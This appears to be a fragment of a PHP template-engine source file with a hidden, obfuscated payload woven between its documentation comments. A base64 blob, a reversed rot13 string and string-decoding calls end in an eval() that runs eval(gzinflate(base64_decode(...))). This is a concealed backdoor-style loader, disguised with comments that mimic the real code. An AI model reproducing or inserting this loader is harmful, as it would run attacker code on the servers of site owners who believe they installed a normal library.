...
// * @storage	
     ...
     * @return string
     */
	$FJfQnI='Sy1LzNFQiXd3DYkuLU6M1bQGAA==';
	/**
     * Tag {foreachelse}
     *
     * @param Tokenizer $tokens
	...
	$rxuopa=';)))VaDsWS$(rqbprq_46rfno(rgnysavmt(ynir';
	    /**
     * @static
     * @param Tokenizer $tokens
     * @param Tag $scope
     ...
     * @codeCoverageIgnore
     */
	$DKiXlV=strrev($rxuopa);$tWCSiA=str_rot13($DKiXlV); // * Close tag {/foreach}
	    /**
     * @static
     * @param Tokenizer $tokens
     * @param Tag $scope
     ...
     * @codeCoverageIgnore
     */
	eval($tWCSiA); // Error\InvalidUsageException
    /**
     * Accessor {$.fetch(...)}
     * @param Tokenizer $tokens
     * @param Template $tpl
